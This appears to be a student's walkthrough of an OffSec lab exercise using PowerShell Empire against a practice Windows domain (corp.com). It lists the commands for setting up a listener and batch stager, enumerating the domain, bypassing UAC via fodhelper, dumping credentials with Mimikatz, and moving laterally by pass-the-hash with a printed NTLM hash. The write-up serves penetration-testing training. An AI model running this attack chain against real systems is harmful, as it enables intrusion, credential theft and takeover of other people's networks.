23.3.1.1

# 23.3.1.1.1. Set up a PowerShell Empire listener and stager and obtain a working agent.

Rdesktop into the Windows client as user corp\offsec
![88d44a217ed17da8f141e4ea26a79d93.png](3ab759b0944d45b4bd4d536bc688dd94.png)
![73650105ec657bf0bb8b0236df179555.png](09a9562649214e12ba19bbc0e95dbe24.png)

Run powershell-empire
![6ba83396aaf315579c592e8d3f9c0603.png](4d487bae887242f3958814f1b02824d7.png)

If you need to remove previous listeners/agents, use the remove command!

Setup an http listener options
`uselistener http`
`set Host`
`set Port`
`info`
![52554368d0fadf6ba6cb3a16b473f115.png](863e0e75c24d41e880a9ae9b29acd3d1.png)

Start the listener, then go back to the main listener menu
`execute`
`back`
![7af57d02b88f691cb0cde1b06f53d912.png](477113b5121a4fdba3a43e207cbcdb6b.png)

Setup the stager. It creates a stager at /tmp/launcher.bat
`usestager windows/launcher_bat`
`info`
`set Listener http`
`execute`
![9830400df67f2ea56b3a62ef0c18c879.png](d0b79fffa48e4447bcf8ccfeb76b5845.png)

Transfer /tmp/launcher.bat to the Windows client via netcat
![d5a7b544c00cc7f1437aa118dae39942.png](0810d54d6740475ebc5a76fead54bb17.png)
![7c5fa3be94ded6064a13f76487555917.png](17ea9645a7dd41d08549b05b0d93a174.png)

Execute launcher.bat from the Windows 10 command prompt. The command prompt disappears in Win 10, but we see an initial agent is now active in Empire
![1e9fbf692466a8c505c601e20258c8a8.png](e3d06eba0bce492d81f0488dabd42baf.png)

Display all active agents
`agents`
![d5c073c46040f83061a5168e855b689c.png](d1578a854f1f445c8481c8d2eb2e284d.png)

Interact with agent 3XCFND1M and display sysinfo
`interact 3XCFND1M`
`sysinfo`
![d6461de8b355d73aa0e2d096d48719fe.png](552bba6da94640d382dbdba0a6eae6ef.png)



# 23.3.1.1.2. Perform enumeration on the domain using the various modules.

### Situational Awareness
Query info for a given user or users in the specified domain. We see the info on users Administrator, krbtgt, Offsec, Jeff_Admin, Adam, iis_service, and sql_service.
`usemodule situational_awareness/network/powerview/get_user`
`info` Ensure that the Agent Value is populated
![db42013e06a1e7abc7cbefb7e49ce71b.png](43129d5668e344068ebd634d272ac57e.png)

`execute`
![95ebaae0f9da137ada3c1b7688b49fb5.png](c880c46cbe324eea97a5d5df124e0454.png)
![85a4ac34119856722f1dd3f2b0564e10.png](2abca9a76f75448e9e16a06cf61f22c6.png)
![7c6cba1d85ee6948e25dbc4726a934c8.png](2fbfe124ae2e4bbe815af0beec7c8a4b.png)
![2e8d4fc50b0834e424a36d876b50eb94.png](d575f86241fc460cb4cc7d5cf19a2fad.png)
![215f78c809fc79c795618e1c6d832dc8.png](22562db554c84598a73d9a253574746b.png)
![2191ccb39a59ddde55f93ab745d4605d.png](4eac5bf114704ab4922fbd92ccdb530b.png)
![998f370d9e3374baf22690f4dc705a75.png](2b690dca003140808ed746fccdc14bd9.png)


### Credentials
The powerup/allchecks module uses techniques based on misconfigurations such as unquoted service paths, improper permissions and service executables.
`usemodule powershell/privesc/powerup/allchecks`
`execute`
![e35a7cea9eff20a6c7e29050c01e88c6.png](f849bb8e88564424818e518989669ef5.png)
![362ace8b6ae58cf7004b5cd75b050fc7.png](66dc547ca6d64cf1999f065cfc8c2eb2.png)
![001dfeb69420e57afc36766a5b97c8c5.png](eaca550936fb4e38b88dbb02425c404c.png)


### Privilege Escalation
The privesc/bypassuac_fodhelper module bypasses uac
`usemodule powershell/privesc/bypassuac_fodhelper`
`info` 
![c57004699da815f2ac88f5097d050ff4.png](d19bdce230bb4fa6aad853f54f209e18.png)

Ensure that the values for Agent and Listener are populated. In this example, we sill need to set the Listener value.
`set Listener http`
`execute`
![5622c6ae6950ed25c47aa28818019b3a.png](a3257e448949459b844e3e945e3abf76.png)

Before continuing, since we know the hash for jeff_admin, run notepad as user jeff_admin on the Windows 10 client, and leave the notepad app open.

After executing, we see another initial agent (ESMY39F2) is active. Interact with ESMY39F2 then use the credentials module
`interact ESMY39F2`
`usemodule credentials/mimikatz/logonpasswords*`
![884ab0eef6e51fa28bfb144f048298c2.png](85d888ca9a294f0dab3d018e29e57a98.png)

We get the hashes for Jeff_admin, Offsec, Administrator, and others
`execute`
![ac56776e792a315ccf1787e24201bb18.png](c6cd767b33b14c75a6a14884c1c4bd52.png)
![30169180a5304726755f4c91488316ee.png](eb847645088645f0a92cb499b8f0cc63.png)
![df97f202295460f1bb92543ceb81637b.png](9f6a8f5e1c794ed38ea30a0f07f3735e.png)

We can even get the collected credentials
`creds`
![a263891acbd8bda0485743b04d9d117e.png](f06d5ad157444a03970483c75b306c61.png)



### Lateral Movement
Executes a stager on remote hosts using SMBExec.ps1. This module requires a username and NTLM hash
`usemodule powershell/lateral_movement/invoke_smbexec`
`info`
![3393246c02ec8ebf7d2a0ff00d7c2cfa.png](d9abf16a85be434195c46aa73162d719.png)

Populate the Values needed for this module, then execute.
`set ComputerName client251`
`set Listener http`
`set Username jeff_admin`
`set Hash 2892d26cdf84d7a70e2eb3b9f05c425e`
`set Domain corp.com`
`execute`
![39e8304f22d21813409d85b0f93b220b.png](4a2b5f86a2a141c096a7b0f65fd3acde.png)

We see another initial agent BF5AUP62 is active as SYSTEM. Check it in agents then interact with it.
`agents`
`interact BF5AUP62`
![f5aad0324e8091541c6766319640d692.png](5c4f417c6b994986a245458b715feb13.png)

`sysinfo`
`shell`
`whoami`
![9a06beca077f27619956be7c3cccd639.png](456209cf32d846169204c2a145b27352.png)



# 23.3.1.1.3. Perform a remote desktop login with the account Jeff_Admin to ensure the credentials are cached on the Windows 10 client and then dump the credentials using PowerShell Empire.

In the previous example, I had already run notepad as user corp\jeff_admin, and cached the credentials. However this time we will remote desktop log in and dump the creds

Remote desktop login as corp\jeff_admin
![c9e82b3983b9a7f9f05ae9155d454341.png](cac1211c7c6c4733a315e84a80b28dec.png)
![4d0b390b75cf7b6284c9cba3e935fb74.png](e972bf4675f144a2adb57bd88b5d31aa.png)

Use the credentials/mimikatz/logonpasswords module
`usemodule credentials/mimikatz/logonpasswords*`
`execute`
![63f01608e551db3510f6101dbe766425.png](b3effcd0467543219006dc3ac6548654.png)
![22081422feb3656d5a5cf70c3bd7646e.png](65b67891f7a94ce4b00bbd03bbc60687.png)
![e5d8ca5e09753b6e46a73ee89b31b7b8.png](3e7c3635b8ad4d16af78092dd53defa7.png)
![8048b6a05aea8e28073c65089f1543b9.png](c6ce42c91f2b42d9b36f12b8a31da79c.png)
![a7b3f8bc2a86187c36d9fd83433ec7aa.png](5d559a52662f4e79b93fc1c547b2afad.png)
![6119dfee3227f9462fe54a848d6f50b5.png](9e6ae3897543411eb6a230b68d437ceb.png)
![eda85a70ec7da4ad6dbbc0dfae46705e.png](db01c695dae1420f85742f76efa17bfd.png)
![3bc7b8e534883c51a92ef017e406b9e3.png](ee3c2c52e41f4294bceaa34e3d88296f.png)
![4123026b29796a24ea825ef0dac64d04.png](25008c18909a4ac7a2e9882fdb88de0b.png)
![37438c2a99663226d5a9bf837ac9a842.png](6462071f535b44749fc6a2b0bc666bef.png)
![818b0a7574dc275419bfe5e1ba1db684.png](56a31f24f41645e5885239287f99b68d.png)
![1f626d35b4678c4723601588ad7d1536.png](2958f522f648487181d7ad64dded84bb.png)
![a4f83d67eaa1feb384ffff4d1208d1c4.png](821fcb6667c04c3c8a01c9da519dc364.png)
![504ead0b7e954d9b6c1f1fe7af07ab94.png](ba23ba5f3a5b442d9de487ca11d16950.png)



# 23.3.1.1.4. Experiment with the different lateral movement modules.

These are the different lateral movement modules
![470cd17eb39d2da841c71a2fea5a4580.png](817613231ee741a781f4f8bf9d595ecb.png)

### invoke_sshcommand
![0331f595003f4e8ca79ecc17edbd7fee.png](bd92307ba6e744b1a190f163e4c34424.png)
![6235e1cdd2d1f408505f78daa36aab84.png](8e93d7c1e6714298afff774e021dc33e.png)

### invoke_psexec
![441d0cb38d0b21c5646a547418fbcaa9.png](3b0122721e6f4c76a3548ab60c996b75.png)
![c4248e239ad1af98076cc436eba54c77.png](8d42863b9e004356a076cd4f62d31d81.png)

### invoke_dcom
![08076fda078a1671ff735852f0fcb85e.png](2f193f2292274e7d9315734de7c668e8.png)
![8b0901e60d9e88a3e5c9b2ab07ae1a1d.png](6b7042475fc0497fa2c6a02418b865ec.png)




